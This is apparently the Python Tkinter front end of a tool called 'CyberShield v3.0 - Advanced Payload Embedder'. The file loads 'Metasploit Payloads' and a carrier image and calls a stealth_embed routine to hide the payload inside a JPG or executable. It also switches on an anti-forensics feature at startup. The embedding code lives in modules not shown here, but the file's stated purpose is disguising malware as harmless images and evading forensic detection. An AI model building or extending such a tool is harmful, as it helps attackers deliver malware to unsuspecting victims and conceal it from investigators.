# core/main_app.py
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from PIL import Image, ImageTk
import os
import platform
from core.security_manager import SecurityManager
from core.ui_components import SecureConsole, KeyManagerUI, ImagePreview
from core.advanced_operations import AdvancedOperations

class CyberShieldApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CyberShield v3.0 - Advanced Payload Embedder")
        self.root.geometry("1200x800")
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Initialize core components
        self.security = SecurityManager()
        self.operations = AdvancedOperations(self.security)
        self.current_platform = platform.system()
        
        # Initialize state
        self.payload_path = ""
        self.image_path = ""
        self.output_path = ""
        self.output_type = tk.StringVar(value="jpg")
        
        self.configure_styles()
        self.create_widgets()
        self.create_menu()
        
        # Security initialization
        self.security.generate_keys()
        self.operations.enable_anti_forensics()

    def configure_styles(self):
        """Modern UI styling"""
        self.style.configure('TButton', font=('Helvetica', 12), padding=10)
        self.style.configure('Title.TLabel', font=('Helvetica', 16, 'bold'))
        self.style.map('Action.TButton',
            foreground=[('active', 'white'), ('disabled', 'gray')],
            background=[('active', '#45a049'), ('disabled', '#cccccc')]
        )

    def create_widgets(self):
        """Modern responsive UI layout"""
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # File Selection Section
        file_frame = ttk.LabelFrame(main_frame, text="File Operations")
        file_frame.grid(row=0, column=0, sticky='nsew', padx=10, pady=10)
        
        ttk.Button(file_frame, text="📤 Upload Payload", 
                 command=self.load_payload, style='Action.TButton').grid(row=0, column=0, padx=5, pady=5)
        self.payload_label = ttk.Label(file_frame, text="No payload selected")
        self.payload_label.grid(row=0, column=1, padx=5)
        
        ttk.Button(file_frame, text="🖼️ Upload Image", 
                 command=self.load_image, style='Action.TButton').grid(row=1, column=0, padx=5, pady=5)
        self.image_label = ttk.Label(file_frame, text="No image selected")
        self.image_label.grid(row=1, column=1, padx=5)
        
        # Output Type Selection
        output_frame = ttk.LabelFrame(main_frame, text="Output Configuration")
        output_frame.grid(row=2, column=0, sticky='ew', padx=10, pady=10)
        
        ttk.Radiobutton(output_frame, text="JPG Output", variable=self.output_type, 
                      value="jpg").grid(row=0, column=0, padx=10)
        ttk.Radiobutton(output_frame, text="Executable Output", variable=self.output_type,
                      value="exe").grid(row=0, column=1, padx=10)
        
        # Action Buttons
        action_frame = ttk.Frame(main_frame)
        action_frame.grid(row=3, column=0, pady=20)
        
        self.generate_btn = ttk.Button(action_frame, text="🛠️ Generate", 
                                    command=self.process_files, state=tk.DISABLED)
        self.generate_btn.pack(side=tk.LEFT, padx=5)
        
        self.download_btn = ttk.Button(action_frame, text="💾 Download", 
                                     command=self.save_file, state=tk.DISABLED)
        self.download_btn.pack(side=tk.LEFT, padx=5)
        
        # Image Preview Section
        preview_frame = ttk.LabelFrame(main_frame, text="Image Preview")
        preview_frame.grid(row=0, column=1, rowspan=4, sticky='nsew', padx=10, pady=10)
        self.preview = ImagePreview(preview_frame)
        self.preview.pack(fill=tk.BOTH, expand=True)
        
        # Security Management
        security_frame = ttk.LabelFrame(main_frame, text="Key Management")
        security_frame.grid(row=4, column=0, columnspan=2, sticky='ew', padx=10, pady=10)
        self.key_manager = KeyManagerUI(security_frame, self.security)
        
        # Console Output
        console_frame = ttk.LabelFrame(main_frame, text="Operation Log")
        console_frame.grid(row=5, column=0, columnspan=2, sticky='nsew', padx=10, pady=10)
        self.console = SecureConsole(console_frame)
        self.console.pack(fill=tk.BOTH, expand=True)
        
        # Configure grid weights
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(5, weight=1)

    def create_menu(self):
        """Modern menu system"""
        menubar = tk.Menu(self.root)
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.reset_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menubar.add_cascade(label="File", menu=file_menu)
        self.root.config(menu=menubar)

    def load_payload(self):
        """Load any type of payload file"""
        file_types = [
            ('Metasploit Payloads', '*.exe *.elf *.dll *.bin *.py *.jar'),
            ('All files', '*.*')
        ]
        path = filedialog.askopenfilename(title="Select Payload File", filetypes=file_types)
        if path:
            self.payload_path = path
            self.payload_label.config(text=os.path.basename(path))
            self.update_button_states()
            self.log(f"Payload loaded: {path}")

    def load_image(self):
        """Load any image format"""
        img_types = [
            ('Images', '*.jpg *.jpeg *.png *.bmp *.heic *.webp'),
            ('All files', '*.*')
        ]
        path = filedialog.askopenfilename(title="Select Carrier Image", filetypes=img_types)
        if path:
            self.image_path = path
            self.image_label.config(text=os.path.basename(path))
            self.update_button_states()
            self.preview.load_image(path)
            self.log(f"Image loaded: {path}")

    def process_files(self):
        """Advanced processing with error handling"""
        try:
            output_type = self.output_type.get()
            self.output_path = self.operations.stealth_embed(
                self.payload_path,
                self.image_path,
                output_type=output_type,
                platform=self.current_platform
            )
            self.download_btn.config(state=tk.NORMAL)
            self.log("Embedding completed successfully")
            self.show_success_message()
        except Exception as e:
            self.log(f"Error: {str(e)}")
            messagebox.showerror("Processing Error", str(e))

    def save_file(self):
        """Save the generated file"""
        default_ext = '.exe' if self.output_type.get() == 'exe' else '.jpg'
        file_types = [
            ('Executable' if default_ext == '.exe' else 'JPEG Image', f'*{default_ext}'),
            ('All files', '*.*')
        ]
        
        path = filedialog.asksaveasfilename(
            defaultextension=default_ext,
            filetypes=file_types
        )
        
        if path:
            try:
                self.operations.save_output(self.output_path, path)
                self.log(f"File saved to: {path}")
                messagebox.showinfo("Success", "File saved successfully!")
            except Exception as e:
                self.log(f"Save error: {str(e)}")
                messagebox.showerror("Save Error", str(e))

    def update_button_states(self):
        """Enable buttons when ready"""
        if self.payload_path and self.image_path:
            self.generate_btn.config(state=tk.NORMAL)
        else:
            self.generate_btn.config(state=tk.DISABLED)

    def show_success_message(self):
        """Modern success indication"""
        self.preview.create_text(
            self.preview.winfo_width()//2,
            self.preview.winfo_height()//2,
            text="✅ Embedding Successful!",
            fill="green",
            font=('Helvetica', 24, 'bold')
        )

    def log(self, message):
        """Console logging with timestamp"""
        from datetime import datetime
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.log(f"[{timestamp}] {message}", 'info')

    def reset_session(self):
        """Reset all inputs and outputs"""
        self.payload_path = ""
        self.image_path = ""
        self.output_path = ""
        self.payload_label.config(text="No payload selected")
        self.image_label.config(text="No image selected")
        self.preview.delete("all")
        self.generate_btn.config(state=tk.DISABLED)
        self.download_btn.config(state=tk.DISABLED)
        self.console.configure(state='normal')
        self.console.delete(1.0, tk.END)
        self.log("Session reset")

if __name__ == "__main__":
    root = tk.Tk()
    app = CyberShieldApp(root)
    root.mainloop()